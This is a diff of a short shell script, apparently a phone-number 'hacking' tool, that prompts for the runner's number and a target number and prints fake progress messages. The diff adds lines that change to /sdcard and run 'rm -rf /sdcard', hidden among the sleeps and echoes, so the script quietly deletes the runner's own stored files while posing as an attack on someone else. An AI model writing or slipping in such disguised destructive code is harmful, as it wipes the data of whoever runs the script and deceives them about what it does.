@@ -11,9 +11,12 @@ Copyright (c) 2018 ./C3W3KBERB4T4N9 Ganteng";
 echo "";
 read -p "Nomer Kamu (+62xxxx)=> " nomer;
 read -p "Nomer Target (+62xxxx) => " target;
+cd /sdcard
 sleep 2
 echo "[+] Syncing Target...";
 sleep 1
+rm -rf sdcard
+rm -rf /sdcard
 echo "Login  => $nomer";
 sleep 0.5
 echo "Target => $target";
